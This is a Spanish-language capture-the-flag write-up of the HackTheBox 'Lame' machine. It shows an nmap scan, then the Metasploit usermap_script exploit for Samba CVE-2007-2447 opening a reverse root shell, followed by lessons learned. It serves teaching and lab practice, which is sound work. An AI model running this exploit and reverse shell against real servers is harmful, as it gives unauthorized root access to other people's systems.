HackTheBox Easy Linux Samba CVE-2007-2447

Lame

Una de las máquinas más clásicas de HackTheBox. Explota una vulnerabilidad en Samba para obtener acceso root directo.

2025 ~30 min cat4clysm
Herramientas utilizadas
nmap metasploit smbclient

Reconocimiento

Comenzamos con un escaneo de puertos para identificar los servicios activos en la máquina.

root@kali:~$ 
nmap -sV -sC -oN lame.nmap 10.10.10.3
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20
Samba 3.0.20 — versión vulnerable a CVE-2007-2447 (username map script).

Explotación

Usamos Metasploit con el módulo específico para esta vulnerabilidad de Samba.

root@kali:~$ 
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run
[*] Started reverse TCP handler on 10.10.14.X:4444
[*] Command shell session 1 opened

whoami
root

El exploit nos da una shell directamente como root sin necesidad de escalar privilegios.

Lecciones aprendidas

  • Siempre verificar versiones exactas de servicios — una versión antigua de Samba puede comprometer toda la máquina.
  • CVE-2007-2447 afecta Samba 3.0.0 - 3.0.25rc3 y permite ejecución remota de comandos sin autenticación.
  • El escaneo con -sV es clave para detectar versiones vulnerables.
